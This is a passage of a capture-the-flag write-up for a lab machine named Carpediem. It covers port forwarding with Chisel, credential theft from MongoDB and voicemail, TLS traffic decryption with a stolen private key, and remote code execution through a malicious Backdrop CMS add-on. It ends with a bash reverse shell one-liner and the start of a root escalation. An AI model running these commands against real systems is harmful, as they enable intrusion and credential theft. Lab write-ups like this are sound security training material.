+<pre tabindex="0"><code>./chisel_1.7.7_linux_amd64 client 10.10.16.23:9001 R:127.0.0.1:8080:172.17.0.3:27017 &amp;
+</code></pre><p>Now, port <em>27017</em> open on the host <em>172.17.0.3</em>, which was accessible only internally, is now forwarded through <em>Chisel</em> listening on my machine port <em>9001</em> and will be accessible for me on port <em>8080</em>.</p>
+<p><img src="chisel_port_forwarding.png" alt="Chisel Port Forwarding"></p>
+<h3 id="reading-important-information-from-mongodb">Reading Important Information From Mongodb</h3>
+<p>I can then use <code>mongosh --port 8080</code> to access the database from my machine:</p>
+<p><img src="accessing_mongodb.png" alt="Accessing Mongodb"></p>
+<p>By listing the databases using <code>show databases</code>, I can see that there is one called <em>trudesk</em>, so after searching a little bit I found some interesting stuff:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">use</span> <span style="color:#a6e22e">trudesk</span> <span style="color:#75715e">// Switch database to trudesk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">show</span> <span style="color:#a6e22e">tables</span> <span style="color:#75715e">// Show available tables
+</span></span></span></code></pre></div><p><img src="show_db_tables.png" alt="Show Tables mongodb"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">accounts</span>.<span style="color:#a6e22e">find</span>() <span style="color:#75715e">// To list all account&#39;s information
+</span></span></span></code></pre></div><p><img src="see_all_db_accounts.png" alt="See All Trudesk Account&amp;rsquo;s Information"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">notifications</span>.<span style="color:#a6e22e">find</span>() <span style="color:#75715e">// To list all the notifications
+</span></span></span></code></pre></div><p><img src="seeing_notifications.png" alt="Seeing Notifications"></p>
+<h2 id="getting-user-on-carpediem">Getting User On Carpediem</h2>
+<h3 id="using-zoiper-to-get-credentials">Using Zoiper To Get Credentials</h3>
+<p>After reading the notifications sent between staff members, it appears that a new employee was hired and one the old staff left him a voice mail about his new credentials. They also recommended using <em>Zoiper</em> as desktop soft phone for him to access his voice mails, so this is what I&rsquo;ll use.</p>
+<ul>
+<li>You can download <em>Zoiper</em> debian package from 
+
+<a href="https://www.zoiper.com/en/voip-softphone/download/current" target="_blank"><em>zoiper&rsquo;s website</em></a> and run the following command in order to install it <code>sudo dpkg -i Zoiper5_5.5.14_x86_64.deb</code></li>
+</ul>
+<p>Usually <em>Zoiper</em> runs on <em>UDP</em> port <em>5060</em>, and I knew that using google, or from the login prompt of the application after installing it.</p>
+<p><img src="continue_as_free_user.png" alt="Zoiper Login For Free"></p>
+<p><img src="zoiper_port.png" alt="Zoiper Port"></p>
+<h3 id="checking-for-open-udp-port-5060-that-zoiper-uses">Checking For Open UDP Port 5060 That Zoiper Uses</h3>
+<p>So if I check that using nmap, I can confirm that the port is indeed open: <code>sudo nmap -p 5060 -sU carpediem.htb</code></p>
+<p><img src="udp_port_5060.png" alt="UDP Open Port"></p>
+<h3 id="hearing-the-message-and-getting-user">Hearing The Message And Getting User</h3>
+<p>From the messages, I saw that in order to login to the domain using zoiper as the new employee, I can use the last <em>4 digits</em> of his employee ID <em>9650</em> as the <em>username</em> and <em>2022</em> as his <em>password</em>. Then to hear the voice mail and get his credentials, I need to dial <em>*62</em> and put the pin code which is <em>2022</em> and then press <em>1</em> to hear it.</p>
+<p><img src="login_as_new_employee.png" alt="Login As New Employee"></p>
+<p><img src="adding_zoiper_domain.png" alt="Adding carpediem.htb as domain"></p>
+<p><img src="click_next_zoiper.png" alt="Click Next"></p>
+<p><img src="dial_code_zoiper.png" alt="Dial Code Zoiper"></p>
+<p><img src="put_the_pin_code.png" alt="Put The Pin Code"></p>
+<p><img src="hearing_message.png" alt="Hear The Message"></p>
+<p>So the password for the new employee is <em>AuRj4pxq9qPk</em>. His name, from the previous notifications, appears to be <em>Horace Flaccus</em>, and previously I saw the emails (when reading account information from mongodb) in the form of <em>[First Initial][Last name]</em>, so my guess is that the new username will be <em>hflaccus</em>, and this what I&rsquo;ll try to provide to see if I can login using <em>SSH</em>.</p>
+<p>And it worked:</p>
+<p><img src="hflaccus_ssh_login.png" alt="SSH Login hflaccus"></p>
+<h2 id="discovering-backdrop-instance">Discovering Backdrop Instance</h2>
+<p>Going back to <em>nmap</em> scan for the ip <em>172.17.0.2</em> (done previously), I can see that it is running a webserver on port <em>443</em> disclosing a new subdomain <em>backdrop.carpediem.htb</em>.</p>
+<p><img src="nmap_scan_backdrop_domain.png" alt="Backdrop Domain Disclosed"></p>
+<p>And aslo from the notifications in mongodb, I noticed some messages related to this webserver running <em>SSL</em> (port 443).</p>
+<p><img src="notifications_backdrop_mongodb.png" alt="Notifications About Backdrop In Mongodb"></p>
+<h3 id="sniffing-traffic-going-to-backdrop">Sniffing Traffic Going To Backdrop</h3>
+<p>In addition, if I run <code>timeout 1 tcpdump</code> I can see that I am able to run <em>tcpdump</em> command which means that I might be able to sniff some traffic and grab credentials.</p>
+<p>Moreover, if I check <em>/etc/ssl/certs/</em> I can see that the certificate and its private key for backdrop cms are present in there:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hflaccus@carpediem:/tmp$ ls -la /etc/ssl/certs/backdrop.carpediem.htb.*
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1269</span> Apr  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2022</span> /etc/ssl/certs/backdrop.carpediem.htb.crt
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1679</span> Apr  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2022</span> /etc/ssl/certs/backdrop.carpediem.htb.key
+</span></span></code></pre></div><p>So what I&rsquo;ll do is to sniff ssl traffic goind to backdrop, decrypt it, and see if I can get some credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hflaccus@carpediem:/tmp$ tcpdump -i docker0 -c <span style="color:#ae81ff">50</span> -nn -A -w 443.pcap port <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>tcpdump: listening on docker0, link-type EN10MB <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>, capture size <span style="color:#ae81ff">262144</span> bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50</span> packets captured
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">57</span> packets received by filter
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> packets dropped by kernel
+</span></span></code></pre></div><ul>
+<li>50 packets should be enough to get credentials.</li>
+</ul>
+<h3 id="decrypting-ssl-traffic">Decrypting SSL Traffic</h3>
+<p>Now, I&rsquo;ll copy the new <em>pcap</em> file and the certificate&rsquo;s private key to my machine and decrypt the traffic to what&rsquo;s happening:</p>
+<pre tabindex="0"><code>scp hflaccus@carpediem.htb:/tmp/443.pcap .
+scp hflaccus@carpediem.htb:/etc/ssl/certs/backdrop.carpediem.htb.key .
+</code></pre><p><img src="copy_pcap_cert_key_to_kali.png" alt="Copying PCAP File And Private Key To Kali"></p>
+<p>To add the private key, I need to head to <em>edit =&gt; prefrecences =&gt; tls =&gt; pre-master key</em> or <em>edit =&gt; prefrecences =&gt; RSA Keys</em>, depending on the wireshark version used, and then add it:</p>
+<p><img src="click_preferences.png" alt="Click Preferences"></p>
+<p><img src="click_add_key.png" alt="Click Add Key"></p>
+<p><img src="choose_key.png" alt="Choose Key"></p>
+<p><img src="click_ok.png" alt="Click OK"></p>
+<p>Then, I can open the <em>pcap</em> file and see the <em>decrypted data</em>:</p>
+<p><img src="wireshark_click_open.png" alt="Wireshark Click Open"></p>
+<p><img src="choose_pcap_wireshark.png" alt="Choose File Wireshark"></p>
+<p>Right away, I can spot a <em>POST</em> request for <em>login</em> page, and if I inspect it, I can see the credentials <em>jpardella:tGPN6AmJDZwYWdhY</em>.</p>
+<p><img src="getting_credentials.png" alt="Getting New Credentials"></p>
+<h3 id="accessing-backdrop-from-kali">Accessing Backdrop From Kali</h3>
+<p>Again, using <em>Chisel</em>, I&rsquo;ll forward the port to my machine:</p>
+<p><img src="upload_chisel_hflaccus.png" alt="Upload Chisel"></p>
+<ul>
+<li>On kali:
+<pre tabindex="0"><code>./chisel_1.7.7_linux_amd64 server -p 9001 --reverse
+</code></pre></li>
+<li>On the target:
+<pre tabindex="0"><code>./chisel_1.7.7_linux_amd64 client 10.10.16.23:9001 R:127.0.0.1:8080:172.17.0.2:443 &amp;
+</code></pre></li>
+</ul>
+<p><img src="forward_backdrop.png" alt="Forward 443 backdrop"></p>
+<p>Now, I am able to access backdrop from kali on <em>https://localhost:8080/</em>:</p>
+<p><img src="access_backdrop_from_kali.png" alt="Accessing Backdrop"></p>
+<p>Since, I have credentials for this site, I can try to login and upload a malicious <em>php</em> file to get <em>RCE</em> on the container:</p>
+<p><img src="login_backdrop.png" alt="Login Backdrop"></p>
+<h3 id="getting-rce-on-backdrop-container">Getting RCE On Backdrop Container</h3>
+<p>The way to upload a malicious <em>php</em> file is by uploading a malicious add-on with crafted php file, as described here: <em>
+
+<a href="https://www.exploit-db.com/exploits/50323" target="_blank">https://www.exploit-db.com/exploits/50323</a></em>. Although <em>Cross Site Request Forgery</em> isn&rsquo;t needed here because I am already logged in, but I can use the step to upload a malicious <em>.tar</em> file containing my php code as add-on, and gain <em>RCE</em> that way.</p>
+<p>Link to the malicious tar file is <em>
+
+<a href="https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/download/backdrop/reference.tar" target="_blank">https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/download/backdrop/reference.tar</a></em>.</p>
+<p><img src="link_to_malicious_tar_file.png" alt="Link To Malicious Tar File"></p>
+<p>So, after downloading the file to my machine, I can list its contents to make sure everything is correct using <code>tar -tf references.tar</code>:</p>
+<p><img src="list_tar_contents.png" alt="List Tar Contents"></p>
+<p>And now I can upload it to <em>backdrop</em> as add-on:</p>
+<p><img src="click_install_module_backdrop.png" alt="Click Install Module Backdrop"></p>
+<p><img src="click_manual_installation_backdrop.png" alt="Click Manual Installation Backdrop"></p>
+<p><img src="upload_tar_file_backdrop.png" alt="Upload Tar File Backdrop"></p>
+<p><img src="click_install_backdrop.png" alt="Click Install Backdrop"></p>
+<p>After that, I can access the shell and run my malicious commands from here: <em>https://localhost:8080/modules/reference/shell.php?cmd=id</em></p>
+<p><img src="run_id_backdrop.png" alt="Run ID Backdrop"></p>
+<p>In order to get a reverse shell, I need to know the ip address of <em>docker</em> interface since there is no route to my machine from docker, so I&rsquo;ll catch a shell from <em>hflaccus</em> user:</p>
+<p><img src="get_docker_ip.png" alt="Get Docker Ip address"></p>
+<p>Using <code>curl</code> and a payload like this, I can trigger the reverse shell:</p>
+<pre tabindex="0"><code>curl -k -s https://localhost:8080/modules/reference/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/1234%200%3E%261%27
+
+# url encoded payload: bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/1234%200%3E%261%27
+# url decoded payload: bash -c &#39;bash -i &gt;&amp; /dev/tcp/172.17.0.1/1234 0&gt;&amp;1&#39; 
+</code></pre><p><img src="getting_reverse_shell_backdrop_hflaccus.png" alt="Getting Reverse Shell Backdrop"></p>
+<h2 id="escalating-to-root">Escalating To Root</h2>
+<h3 id="finding-cronjobs-executed-by-root">Finding Cronjobs Executed By Root</h3>
+<p>If run the command <code>ps aux</code>, I can see that root user is executing some scripts:</p>
+<p><img src="seeing_root_running_scripts_docker.png" alt="Root Executes Some Scripts Docker"></p>
+<p><img src="reading_cron_job_script.png" alt="Reading The Scripts"></p>
+<p>This script is checking the integrity of <em>/var/www/html/backdrop/core/scripts/backdrop.sh</em> and executes it by providing some parameters.</p>
+<p>Reading the file to see what it does, reveals that the script takes a <em>URI</em> parameter and requests <em>index.php</em> from that <em>URI</em> and then executes it, which means that since root user is providing <em>https://localhost</em> uri where I have write permission to its files, I can override <em>index.php</em> and add my malicious script to escalate to root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">cat</span> <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">www</span><span style="color:#f92672">/</span><span style="color:#a6e22e">html</span><span style="color:#f92672">/</span><span style="color:#a6e22e">backdrop</span><span style="color:#f92672">/</span><span style="color:#a6e22e">core</span><span style="color:#f92672">/</span><span style="color:#a6e22e">scripts</span><span style="color:#f92672">/</span><span style="color:#a6e22e">backdrop</span><span style="color:#f92672">.</span><span style="color:#a6e22e">sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Backdrop shell execution script
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Check for your PHP interpreter - on Windows you&#39;ll probably have to
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * replace line 1 with
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *   #!c:/program files/php/php.exe
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @param path  Backdrop&#39;s absolute root directory in local file system (optional).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @param URI   A URI to execute, including HTTP protocol prefix.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> */</span>
+</span></span><span style="display:flex;"><span>$script <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>(<span style="color:#a6e22e">array_shift</span>($_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>]));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>(<span style="color:#e6db74">&#39;--help&#39;</span>, $_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>]) <span style="color:#f92672">||</span> <span style="color:#66d9ef">empty</span>($_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>])) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&lt;&lt;&lt;</span><span style="color:#e6db74">EOF</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Execute a Backdrop page from the shell.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Usage:        {$script} [OPTIONS] &#34;&lt;URI&gt;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Example:      {$script} &#34;http://mysite.org/node&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">All arguments are long options.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  --help      This page.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  --root      Set the working directory for the script to the specified path.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              To execute Backdrop this has to be the root directory of your
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              Backdrop installation, f.e. /home/www/foo/backdrop (assuming
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              Backdrop is running on Unix). Current directory is not required.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              Use surrounding quotation marks on Windows.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  --verbose   This option displays the options as they are set, but will
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              produce errors from setting the session.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  URI         The URI to execute, i.e. http://default/foo/bar for executing
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              the path &#39;/foo/bar&#39; in your site &#39;default&#39;. URI has to be
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              enclosed by quotation marks if there are ampersands in it
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              (f.e. index.php?q=node&amp;foo=bar). Prefix &#39;http://&#39; is required,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              and the domain must exist in Backdrop&#39;s sites-directory.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              If the given path and file exists it will be executed directly,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              i.e. if URI is set to http://default/bar/foo.php
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              and bar/foo.php exists, this script will be executed without
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              bootstrapping Backdrop. To execute Backdrop&#39;s cron.php, specify
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              http://default/core/cron.php as the URI.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">To run this script without --root argument invoke it from the root directory
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">of your Backdrop installation with
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ./scripts/{$script}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">EOF</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// define default settings
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;index.php&#39;</span>;
+</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;HTTP_HOST&#39;</span>]       <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;default&#39;</span>;
+</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>]        <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/index.php&#39;</span>;
+</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]     <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>;
+</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;SERVER_SOFTWARE&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">NULL</span>;
+</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>]  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;GET&#39;</span>;
+</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;QUERY_STRING&#39;</span>]    <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>]        <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span>;
+</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;console&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// toggle verbose mode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>(<span style="color:#e6db74">&#39;--verbose&#39;</span>, $_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>])) {
+</span></span><span style="display:flex;"><span>  $_verbose_mode <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>  $_verbose_mode <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// parse invocation arguments
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">while</span> ($param <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_shift</span>($_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>])) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> ($param) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;--root&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// change working directory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      $path <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_shift</span>($_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>]);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_dir</span>($path)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">chdir</span>($path);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($_verbose_mode) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;cwd changed to: </span><span style="color:#e6db74">{</span>$path<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">ERROR: </span><span style="color:#e6db74">{</span>$path<span style="color:#e6db74">}</span><span style="color:#e6db74"> not found.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">substr</span>($param, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;--&#39;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ignore unknown options
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// parse the URI
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $path <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($param);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// set site name
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($path[<span style="color:#e6db74">&#39;host&#39;</span>])) {
+</span></span><span style="display:flex;"><span>          $_SERVER[<span style="color:#e6db74">&#39;HTTP_HOST&#39;</span>] <span style="color:#f92672">=</span> $path[<span style="color:#e6db74">&#39;host&#39;</span>];
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// set query string
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($path[<span style="color:#e6db74">&#39;query&#39;</span>])) {
+</span></span><span style="display:flex;"><span>          $_SERVER[<span style="color:#e6db74">&#39;QUERY_STRING&#39;</span>] <span style="color:#f92672">=</span> $path[<span style="color:#e6db74">&#39;query&#39;</span>];
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">parse_str</span>($path[<span style="color:#e6db74">&#39;query&#39;</span>], $_GET);
+</span></span><span style="display:flex;"><span>          $_REQUEST <span style="color:#f92672">=</span> $_GET;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// set file to execute or Backdrop path (clean URLs enabled)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($path[<span style="color:#e6db74">&#39;path&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">file_exists</span>(<span style="color:#a6e22e">substr</span>($path[<span style="color:#e6db74">&#39;path&#39;</span>], <span style="color:#ae81ff">1</span>))) {
+</span></span><span style="display:flex;"><span>          $_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>] <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>] <span style="color:#f92672">=</span> $path[<span style="color:#e6db74">&#39;path&#39;</span>];
+</span></span><span style="display:flex;"><span>          $cmd <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($path[<span style="color:#e6db74">&#39;path&#39;</span>], <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elseif</span> (<span style="color:#a6e22e">isset</span>($path[<span style="color:#e6db74">&#39;path&#39;</span>])) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;q&#39;</span>])) {
+</span></span><span style="display:flex;"><span>            $_REQUEST[<span style="color:#e6db74">&#39;q&#39;</span>] <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;q&#39;</span>] <span style="color:#f92672">=</span> $path[<span style="color:#e6db74">&#39;path&#39;</span>];
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// display setup in verbose mode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ($_verbose_mode) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Hostname set to: </span><span style="color:#e6db74">{</span>$_SERVER[<span style="color:#e6db74">&#39;HTTP_HOST&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Script name set to: </span><span style="color:#e6db74">{</span>$cmd<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Path set to: </span><span style="color:#e6db74">{</span>$_GET[<span style="color:#e6db74">&#39;q&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
